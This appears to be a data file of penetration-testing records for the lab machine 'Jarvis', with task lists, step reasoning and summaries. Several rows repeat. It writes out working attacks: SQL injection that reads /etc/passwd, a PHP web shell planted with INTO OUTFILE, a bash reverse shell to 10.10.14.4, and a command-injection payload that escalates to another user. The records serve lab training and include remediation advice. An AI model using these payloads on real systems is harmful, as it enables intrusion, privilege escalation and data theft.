       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)
   1.9 Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} (completed)
       1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} (completed)
       1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell""); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} (completed)
       1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} (completed)
       1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} (completed)
   2.0 Privilege Escalation - [to-do]
       2.1 Sudo Privileges Analysis for User www-data on Server ""Jarvis"" - (completed)
           2.1.1 Context - {Investigation of `sudo` permissions for the user `www-data`} (completed)
           2.1.2 Environment Details - {Server: Jarvis; Location: `/var/www/html`} (completed)
           2.1.3 Sudo Permissions - {Command: `sudo -l`; Defaults Entries: `env_reset` ensures a minimal environment is passed to the command, `mail_badpass` sends an email if a bad password is entered, `secure_path` specifies a secure PATH setting (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`)} (completed)
           2.1.4 Privileged Commands - {Permitted Command for www-data: Target User: pepper; Command: `/var/www/Admin-Utilities/simpler.py`; Permission: NOPASSWD (No password required for execution)} (completed)
           2.1.5 Security Implications - {The `www-data` user has passwordless `sudo` rights to execute `simpler.py` as the user `pepper`. This configuration can be potentially exploited if `simpler.py` is vulnerable to tampering or if `www-data` is compromised} (completed)
           2.1.6 Recommendations - {Review and Secure `simpler.py`: Ensure that `simpler.py` does not contain exploitable code or vulnerabilities that could be used to escalate privileges or execute arbitrary code. Implement strict access controls and regular audits on `simpler.py` to prevent unauthorized modifications. Limit Sudo Privileges: Reassess the necessity of granting `sudo` permissions to `www-data` for executing scripts as other users, especially without a password. Consider implementing command restrictions or requiring a password for sensitive operations to enhance security. Audit and Monitoring: Set up comprehensive logging and monitoring for actions performed using `sudo`, particularly for scripts executed with elevated privileges. Regularly review logs for unusual or unauthorized `sudo` activity. Incident Response Preparedness: Develop and test incident response plans that include scenarios of privilege escalation and unauthorized access through misuse of `sudo` privileges. This configuration should be carefully managed to prevent potential security breaches, considering the high level of access granted by these permissions} (completed)
       2.2 Security Analysis of Python Script for Command Injection Vulnerability - (completed)
           2.2.1 Script Functionality - {Purpose: Executes a ping command based on user input. Function: `exec_ping()`. Input Handling: Takes an IP address from user input and attempts to ping it} (completed)
           2.2.2 Security Measures in Place - {Filtered Characters: The script explicitly blocks a set of characters (`&`, `;`, `-.`, `` ` ``, `||`, `|`) to prevent command injection} (completed)
           2.2.3 Vulnerability Assessment - {Unfiltered Characters: The script does not block the use of `$`, `(`, and `)` characters. Potential Exploit: These unblocked characters can be used for bash command substitution (e.g., `$(cmd)`), which may allow an attacker to inject additional commands} (completed)
           2.2.4 Exploit Test - {Method: Use the script to test if command substitution (`$(cmd)`) allows execution of unintended commands. Example Test Input: Entering `127.0.0.1 $(id)` as the IP address to see if the script inadvertently executes the `id` command} (completed)
           2.2.5 Security Implications - {Allowing command substitution presents a significant security risk, potentially enabling attackers to execute arbitrary commands on the server or local machine where the script is running} (completed)
           2.2.6 Recommendations - {Enhance Input Validation: Update the script to filter out additional special characters and patterns that could lead to command injection, including `$`, `(`, and `)`. Use Secure Functions: Replace `os.system()` with more secure alternatives like `subprocess.run()`, which can safely handle command parameters without the risk of shell injection. Ensure commands are passed as lists to `subprocess.run()` to avoid shell interpretation. Security Testing: Implement automated tests to check for common injection patterns. Regularly update the list of forbidden characters based on emerging threats and exploit techniques. Code Audits: Conduct regular code reviews and security audits to identify and mitigate potential vulnerabilities. Educate developers on secure coding practices, particularly regarding input validation and handling external commands} (completed)",Check the content of the file and find a way to manipulate it,"1. **Assessment of Current Strategic Position**:
   - The updated PTT and previous analysis have established that the user `www-data` has passwordless sudo access to execute `simpler.py` as the user `pepper`. This presents a significant opportunity for privilege escalation if the script can be manipulated or exploited.
   - The focus now shifts to understanding the exact nature of `simpler.py`, its functionalities, and any potential vulnerabilities within the script that can be exploited.

2. **Key Findings Leading to Further Steps**:
   - **Passwordless Sudo Permission**: The critical finding that `simpler.py` can be executed without a password underlines a direct pathway to escalate privileges if vulnerabilities exist within the script.
   - **Potential for Code Manipulation**: If `simpler.py` is writable by `www-data`, or if it executes other scripts or commands that are insecure, there could be potential to modify its behavior to execute arbitrary commands with elevated privileges.

3. **Logical Progression to Selected Step**:
   - **Exploring `simpler.py`**: The strategy involves opening and reading through the `simpler.py` script to understand its code structure, what commands it executes, how it handles input, and whether it includes or references other files. This step is crucial to identify any insecure practices such as command injection points, unsanitized inputs, or unsafe file operations.
   - **Creating a Summary of Findings**: Document each observation about potential vulnerabilities, such as hard-coded paths, use of external commands, or other scripts that `simpler.py` might be calling. This summary will guide the exploitation phase, where specific vulnerabilities identified in `simpler.py` can be targeted to escalate privileges.
   - **Finding a Method to Exploit**: Based on the content analysis, determine how `simpler.py` can be exploited. This might involve injecting commands, exploiting path traversal vulnerabilities, or leveraging any misconfigurations. The goal is to modify the execution flow of `simpler.py` to run arbitrary commands as `pepper` or potentially escalate to root.

4. **Ethical and Security Considerations**:
   - **Controlled Exploration**: Ensure that the exploration of `simpler.py` is conducted in a controlled environment to prevent unintended system changes or disruptions. The focus should be on identifying vulnerabilities without exploiting them in a harmful manner.
   - **Documentation and Reporting**: Maintain detailed documentation of all findings and methods of potential exploitation. This documentation is vital for replicating the issues found and for the development of patches or security measures to mitigate these vulnerabilities.

By progressing with the strategy to explore the contents of `simpler.py` and finding ways to manipulate it, we are leveraging known vulnerabilities for a deeper security assessment. This approach is essential to potentially escalate privileges and enhance system security by addressing and mitigating discovered vulnerabilities.","**Security Analysis of Python Script for Command Injection Vulnerability**

- **Script Functionality:**
  - **Purpose:** Executes a ping command based on user input.
  - **Function:** `exec_ping()`
  - **Input Handling:** Takes an IP address from user input and attempts to ping it.

- **Security Measures in Place:**
  - **Filtered Characters:** The script explicitly blocks a set of characters (`&`, `;`, `-.`, `` ` ``, `||`, `|`) to prevent command injection.

- **Vulnerability Assessment:**
  - **Unfiltered Characters:** The script does not block the use of `$`, `(`, and `)` characters.
  - **Potential Exploit:** These unblocked characters can be used for bash command substitution (e.g., `$(cmd)`), which may allow an attacker to inject additional commands.

- **Exploit Test:**
  - **Method:** Use the script to test if command substitution (`$(cmd)`) allows execution of unintended commands.
  - **Example Test Input:** Entering `127.0.0.1 $(id)` as the IP address to see if the script inadvertently executes the `id` command.

**Security Implications:**
- Allowing command substitution presents a significant security risk, potentially enabling attackers to execute arbitrary commands on the server or local machine where the script is running.

**Recommendations:**
1. **Enhance Input Validation:**
   - Update the script to filter out additional special characters and patterns that could lead to command injection, including `$`, `(`, and `)`.
   - Consider using more robust methods to sanitize input, such as using regular expressions to allow only strictly formatted IP addresses.

2. **Use Secure Functions:**
   - Replace `os.system()` with more secure alternatives like `subprocess.run()`, which can safely handle command parameters without the risk of shell injection.
   - Ensure commands are passed as lists to `subprocess.run()` to avoid shell interpretation.

3. **Security Testing:**
   - Implement automated tests to check for common injection patterns.
   - Regularly update the list of forbidden characters based on emerging threats and exploit techniques.

4. **Code Audits:**
   - Conduct regular code reviews and security audits to identify and mitigate potential vulnerabilities.
   - Educate developers on secure coding practices, particularly regarding input validation and handling external commands.

By addressing these issues, the script can be made more secure against command injection attacks, protecting both the system and its data from potential breaches.",Exploit the found exploitaiton,"1. **Evaluation of Previous Step Achievement**:
   - The previous step in the penetration testing task list (PTT) successfully analyzed the `simpler.py` script, identifying specific vulnerabilities related to command injection. The script was found to improperly filter user input, allowing for potential command substitution using characters such as `$`, `(`, and `)`.
   - This finding is significant as it provides a clear method to potentially execute arbitrary commands on the system, exploiting the script's functionality to ping an IP address based on user input.

2. **Key Findings and Implications for Further Steps**:
   - **Identified Vulnerability**: The ability to use command substitution in the `simpler.py` script opens a direct avenue for executing additional commands under the privileges of the user `pepper`, whom `www-data` can impersonate without a password.
   - **Potential for Privilege Escalation**: Given that `simpler.py` is executable by `www-data` with `sudo` and without a password, exploiting this command injection vulnerability could allow escalation from `www-data` to `pepper`, and possibly further if `pepper` has additional privileges.

3. **Strategy Evaluation and Next Steps**:
   - **Exploit the Found Vulnerability**: The logical next step is to exploit the identified vulnerability in `simpler.py`. This involves crafting an input that includes a command substitution to execute arbitrary commands or scripts that could escalate privileges or perform other malicious actions under the user `pepper`.
   - **Create and Execute Exploit Code**: Develop a payload that utilizes the unfiltered characters to inject commands into the `simpler.py` script execution process. Test the payload in a controlled environment to confirm that it achieves the desired effect without causing unintended damage or disruption.
   - **Continue with the Current Strategy**: Since a direct method for exploitation has been identified and the potential impact is high, it is appropriate to continue with this strategy. The focus should be on carefully crafting the exploit to ensure effectiveness and minimize risks.

Given the successful identification of a specific and exploitable vulnerability in `simpler.py`, the strategy to exploit this vulnerability is both necessary and logical. This step is crucial for demonstrating the potential security risks associated with the script and for taking the penetration testing process to the next stage of privilege escalation. By exploiting this vulnerability, the security assessment can provide valuable insights into system weaknesses and recommendations for strengthening security measures.",Exploit the selected exploitations,"1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) has successfully identified a command injection vulnerability in the `simpler.py` script, which is executable by the `www-data` user using sudo without a password. This vulnerability allows for the injection of arbitrary commands using unfiltered characters such as `$`, `(`, and `)`.
   - The script’s vulnerability to command substitution offers a potential pathway for privilege escalation from the `www-data` user to the `pepper` user, under whose privileges the script runs.

2. **Key Findings Leading to Further Steps**:
   - **Identified Command Injection Vulnerability**: The ability to manipulate the `simpler.py` script to execute unintended commands provides a direct method for escalating privileges. This is particularly impactful because of the script’s association with sudo privileges that do not require password authentication.
   - **Potential for Privilege Escalation**: The script runs as the `pepper` user, who may have higher privileges than `www-data`. Exploiting this script could potentially allow access to restricted areas of the system or the execution of privileged operations.

3. **Logical Progression to Selected Step**:
   - **Exploiting the Vulnerability**: Given the identified vulnerabilities and the permissions associated with the script, the next logical step is to exploit this flaw. This involves crafting an input that leverages the command substitution vulnerability to execute commands that can further penetrate the system or elevate privileges.
   - **Crafting and Testing the Exploit**: Develop a payload that exploits the command substitution by inserting commands that `pepper` can execute. This might include creating a reverse shell or modifying system files. It is crucial to test this payload in a controlled environment to ensure it functions as expected without causing undue harm or triggering security mechanisms that could lock out the tester.
   - **Implementation of the Exploit**: Once the payload has been safely tested, implement the exploit on the target system. Monitor the execution to ensure it achieves the desired outcome of escalating privileges or accessing sensitive information.

4. **Ethical and Security Considerations**:
   - **Controlled Execution**: Ensure that the exploitation process is controlled and monitored to prevent unexpected system behaviors or potential damage. This includes having a rollback plan in case the exploitation goes beyond the intended scope.
   - **Documentation and Reporting**: Keep detailed records of the exploitation process, including the specific commands used and the system responses. This documentation is crucial for replicating the exploit in future tests and for developing mitigations against similar vulnerabilities.

By moving forward with the strategy to exploit the identified vulnerabilities in `simpler.py`, we are leveraging a known weakness to demonstrate a significant security risk. This approach is essential for validating the severity of the vulnerability and for providing concrete examples of how such vulnerabilities could be exploited in real-world scenarios. This step is crucial for enhancing the overall security posture of the system by addressing and mitigating discovered vulnerabilities.","{'Metasploit': 'Exploit the command injection vulnerability in simpler.py to escalate privileges.', 'Netcat': 'Create a reverse shell payload to execute commands as the pepper user.'}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)
   1.9 Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} (completed)
       1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} (completed)
       1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell""); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} (completed)
       1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} (completed)
       1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} (completed)
   2.0 Privilege Escalation - [to-do]
       2.1 Sudo Privileges Analysis for User www-data on Server ""Jarvis"" - (completed)
           2.1.1 Context - {Investigation of `sudo` permissions for the user `www-data`} (completed)
           2.1.2 Environment Details - {Server: Jarvis; Location: `/var/www/html`} (completed)
           2.1.3 Sudo Permissions - {Command: `sudo -l`; Defaults Entries: `env_reset` ensures a minimal environment is passed to the command, `mail_badpass` sends an email if a bad password is entered, `secure_path` specifies a secure PATH setting (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`)} (completed)
           2.1.4 Privileged Commands - {Permitted Command for www-data: Target User: pepper; Command: `/var/www/Admin-Utilities/simpler.py`; Permission: NOPASSWD (No password required for execution)} (completed)
           2.1.5 Security Implications - {The `www-data` user has passwordless `sudo` rights to execute `simpler.py` as the user `pepper`. This configuration can be potentially exploited if `simpler.py` is vulnerable to tampering or if `www-data` is compromised} (completed)
           2.1.6 Recommendations - {Review and Secure `simpler.py`: Ensure that `simpler.py` does not contain exploitable code or vulnerabilities that could be used to escalate privileges or execute arbitrary code. Implement strict access controls and regular audits on `simpler.py` to prevent unauthorized modifications. Limit Sudo Privileges: Reassess the necessity of granting `sudo` permissions to `www-data` for executing scripts as other users, especially without a password. Consider implementing command restrictions or requiring a password for sensitive operations to enhance security. Audit and Monitoring: Set up comprehensive logging and monitoring for actions performed using `sudo`, particularly for scripts executed with elevated privileges. Regularly review logs for unusual or unauthorized `sudo` activity. Incident Response Preparedness: Develop and test incident response plans that include scenarios of privilege escalation and unauthorized access through misuse of `sudo` privileges. This configuration should be carefully managed to prevent potential security breaches, considering the high level of access granted by these permissions} (completed)
       2.2 Security Analysis of Python Script for Command Injection Vulnerability - (completed)
           2.2.1 Script Functionality - {Purpose: Executes a ping command based on user input. Function: `exec_ping()`. Input Handling: Takes an IP address from user input and attempts to ping it} (completed)
           2.2.2 Security Measures in Place - {Filtered Characters: The script explicitly blocks a set of characters (`&`, `;`, `-.`, `` ` ``, `||`, `|`) to prevent command injection} (completed)
           2.2.3 Vulnerability Assessment - {Unfiltered Characters: The script does not block the use of `$`, `(`, and `)` characters. Potential Exploit: These unblocked characters can be used for bash command substitution (e.g., `$(cmd)`), which may allow an attacker to inject additional commands} (completed)
           2.2.4 Exploit Test - {Method: Use the script to test if command substitution (`$(cmd)`) allows execution of unintended commands. Example Test Input: Entering `127.0.0.1 $(id)` as the IP address to see if the script inadvertently executes the `id` command} (completed)
           2.2.5 Security Implications - {Allowing command substitution presents a significant security risk, potentially enabling attackers to execute arbitrary commands on the server or local machine where the script is running} (completed)
           2.2.6 Recommendations - {Enhance Input Validation: Update the script to filter out additional special characters and patterns that could lead to command injection, including `$`, `(`, and `)`. Use Secure Functions: Replace `os.system()` with more secure alternatives like `subprocess.run()`, which can safely handle command parameters without the risk of shell injection. Ensure commands are passed as lists to `subprocess.run()` to avoid shell interpretation. Security Testing: Implement automated tests to check for common injection patterns. Regularly update the list of forbidden characters based on emerging threats and exploit techniques. Code Audits: Conduct regular code reviews and security audits to identify and mitigate potential vulnerabilities. Educate developers on secure coding practices, particularly regarding input validation and handling external commands} (completed)
       2.3 Command Injection Exploit Analysis and Reverse Shell Execution - (completed)
           2.3.1 Initial Command Substitution Test - {Observation: Using command substitution, the username ""pepper"" was injected, and the system attempted to resolve it as a hostname, confirming that command execution via substitution was successful} (completed)
           2.3.2 Exploitation Strategy - {Objective: Gain a shell with the privileges of the user ""pepper"". Method: Due to restrictions on some special characters, the plan involves writing a reverse shell script and executing it through command injection} (completed)
           2.3.3 Steps to Execute the Reverse Shell - {1. Script Creation: Command: `echo 'bash -c ""bash -i >& /dev/tcp/10.10.14.4/4444 0>&1""' > /tmp/shell.sh`, Purpose: Writes a bash reverse shell script that connects back to the attacker's machine at `10.10.14.4` on port `4444`. 2. Make Script Executable: Command: `chmod a+x /tmp/shell.sh`, Purpose: Changes the permissions of `shell.sh` to ensure it is executable. 3. Execute Script via Command Injection: Injection Point: Within the `simpler.py` script execution context, using `sudo -u pepper`. Injected Command: `$(/tmp/shell.sh)`, Result: Successfully obtained a reverse shell as the user ""pepper""} (completed)
           2.3.4 Security Implications - {The ability to write and execute arbitrary scripts highlights significant security weaknesses, particularly around input validation and privilege management. Execution of arbitrary code as another user (pepper) via command injection poses a severe security risk, potentially leading to unauthorized access and control over the system} (completed)
           2.3.5 Recommendations - {Immediate Remediation: Remove the `shell.sh` script and audit the system for any other malicious files or scripts. Patch the vulnerabilities in the `simpler.py` script to prevent further exploitation. Enhance Security Measures: Implement stringent input validation in all scripts and applications to prevent command injection. Review and restrict sudo permissions to minimize the risk of privilege escalation. Regularly update and audit security policies and practices to address new and emerging threats. Monitoring and Logging: Enhance monitoring of system logs for unusual activities that could indicate attempted or successful exploitation. Set up alerts for unauthorized changes to critical files and configurations} (completed)",Exploit the found exploitaiton,"1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) has successfully identified a command injection vulnerability in the `simpler.py` script, which is executable by the `www-data` user using sudo without a password. This vulnerability allows for the injection of arbitrary commands using unfiltered characters such as `$`, `(`, and `)`.
   - The script’s vulnerability to command substitution offers a potential pathway for privilege escalation from the `www-data` user to the `pepper` user, under whose privileges the script runs.

2. **Key Findings Leading to Further Steps**:
   - **Identified Command Injection Vulnerability**: The ability to manipulate the `simpler.py` script to execute unintended commands provides a direct method for escalating privileges. This is particularly impactful because of the script’s association with sudo privileges that do not require password authentication.
   - **Potential for Privilege Escalation**: The script runs as the `pepper` user, who may have higher privileges than `www-data`. Exploiting this script could potentially allow access to restricted areas of the system or the execution of privileged operations.

3. **Logical Progression to Selected Step**:
   - **Exploiting the Vulnerability**: Given the identified vulnerabilities and the permissions associated with the script, the next logical step is to exploit this flaw. This involves crafting an input that leverages the command substitution vulnerability to execute commands that can further penetrate the system or elevate privileges.
   - **Crafting and Testing the Exploit**: Develop a payload that exploits the command substitution by inserting commands that `pepper` can execute. This might include creating a reverse shell or modifying system files. It is crucial to test this payload in a controlled environment to ensure it functions as expected without causing undue harm or triggering security mechanisms that could lock out the tester.
   - **Implementation of the Exploit**: Once the payload has been safely tested, implement the exploit on the target system. Monitor the execution to ensure it achieves the desired outcome of escalating privileges or accessing sensitive information.

4. **Ethical and Security Considerations**:
   - **Controlled Execution**: Ensure that the exploitation process is controlled and monitored to prevent unexpected system behaviors or potential damage. This includes having a rollback plan in case the exploitation goes beyond the intended scope.
   - **Documentation and Reporting**: Keep detailed records of the exploitation process, including the specific commands used and the system responses. This documentation is crucial for replicating the exploit in future tests and for developing mitigations against similar vulnerabilities.

By moving forward with the strategy to exploit the identified vulnerabilities in `simpler.py`, we are leveraging a known weakness to demonstrate a significant security risk. This approach is essential for validating the severity of the vulnerability and for providing concrete examples of how such vulnerabilities could be exploited in real-world scenarios. This step is crucial for enhancing the overall security posture of the system by addressing and mitigating discovered vulnerabilities.","**Command Injection Exploit Analysis and Reverse Shell Execution**

- **Initial Command Substitution Test:**
  - **Observation:** Using command substitution, the username ""pepper"" was injected, and the system attempted to resolve it as a hostname, confirming that command execution via substitution was successful.

- **Exploitation Strategy:**
  - **Objective:** Gain a shell with the privileges of the user ""pepper"".
  - **Method:** Due to restrictions on some special characters, the plan involves writing a reverse shell script and executing it through command injection.

- **Steps to Execute the Reverse Shell:**
  1. **Script Creation:**
     - **Command:** `echo 'bash -c ""bash -i >& /dev/tcp/10.10.14.4/4444 0>&1""' > /tmp/shell.sh`
     - **Purpose:** Writes a bash reverse shell script that connects back to the attacker's machine at `10.10.14.4` on port `4444`.
  
  2. **Make Script Executable:**
     - **Command:** `chmod a+x /tmp/shell.sh`
     - **Purpose:** Changes the permissions of `shell.sh` to ensure it is executable.
  
  3. **Execute Script via Command Injection:**
     - **Injection Point:** Within the `simpler.py` script execution context, using `sudo -u pepper`.
     - **Injected Command:** `$(/tmp/shell.sh)`
     - **Result:** Successfully obtained a reverse shell as the user ""pepper"".

- **Security Implications:**
  - The ability to write and execute arbitrary scripts highlights significant security weaknesses, particularly around input validation and privilege management.
  - Execution of arbitrary code as another user (pepper) via command injection poses a severe security risk, potentially leading to unauthorized access and control over the system.

- **Recommendations:**
  1. **Immediate Remediation:**
     - Remove the `shell.sh` script and audit the system for any other malicious files or scripts.
     - Patch the vulnerabilities in the `simpler.py` script to prevent further exploitation.
  
  2. **Enhance Security Measures:**
     - Implement stringent input validation in all scripts and applications to prevent command injection.
     - Review and restrict sudo permissions to minimize the risk of privilege escalation.
     - Regularly update and audit security policies and practices to address new and emerging threats.
  
  3. **Monitoring and Logging:**
     - Enhance monitoring of system logs for unusual activities that could indicate attempted or successful exploitation.
     - Set up alerts for unauthorized changes to critical files and configurations.

By addressing these points, the security posture against similar exploitation techniques can be significantly strengthened, protecting the integrity and confidentiality of the system and its data.",Enumerate the machine to find more information for privilege escalatino,"1. **Evaluation of Previous Step Achievement**:
   - The previous steps in the penetration testing task list (PTT) successfully exploited a command injection vulnerability in the `simpler.py` script, allowing the execution of arbitrary commands as the user `pepper` via a reverse shell. This was confirmed by the successful execution of a reverse shell script that connected back to the attacker's machine, providing shell access as `pepper`.
